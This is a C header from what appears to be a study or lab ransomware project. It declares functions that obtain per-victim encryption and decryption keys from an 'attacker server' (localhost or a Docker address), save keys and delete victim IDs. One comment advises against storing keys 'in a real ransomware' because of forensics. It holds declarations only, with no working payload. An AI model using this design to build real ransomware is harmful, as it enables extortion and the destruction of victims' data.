#ifndef SERVER_H
#define SERVER_H

#define KEY_HOST "localhost"
#define KEY_HOST_DOCKER "30.0.0.2"
#define KEY_PORT 5000
#define API_URL "/api/keys/"
#define REQ_POST "POST"
#define REQ_DEL "DELETE"
#define GET_ENC_KEY_ENDPOINT "generate"
#define GET_DEC_KEY_ENDPOINT "decrypt"
#define DEL_IDENTIFIER_ENDPOINT ""
#define MSG_SIZE 1024
#define RESPONSE_SIZE 4096
#define ALGO_SIZE 32
#define ENC_RSA_KEY_NAME "public.pem"
#define DEC_RSA_KEY_NAME "private.pem"

#include "benchmark.h"

/**
 * @brief Connect to the server and get the encryption key, the algorithm for encryption is chose thanks to a benchmark.
 * @param p_identifier The unique identifier of the victim in aim to store encryption and decryption keys associate to it.
 * @param p_data The benchmark data of the current computer.
 * @param p_algo The algorithm chosen by attacker server.
*/
unsigned char* get_encryption_key(unsigned char* p_identifier, benchmarkData* p_data, unsigned char** p_algo, unsigned char** p_iv);

/**
 * @brief Connect to the server and get the decryption key.
 * @param p_identifier The unique identifier of the victim in aim to retrieve the decryption keys associate to it.
 * @param p_algo The algorithm chosen by attacker server.
*/
unsigned char* get_decryption_key(unsigned char* p_identifier, unsigned char** p_algo, unsigned char** p_iv);

/**
 * @brief Save a key in a file.
 * @param p_key The key to save.
 * @param p_filename The name of the file to save the key in
 * @warning Save the key in a file is not recommended in a real ransomware, especially a symmetric key due to forensic methods.
*/
void save_key(char* p_key, char* p_filename);

/**
 * @brief Delete the identifier of the victim in the database.
 * @param p_id The identifier to delete.
*/
void delete_id(unsigned char* p_id);

#endif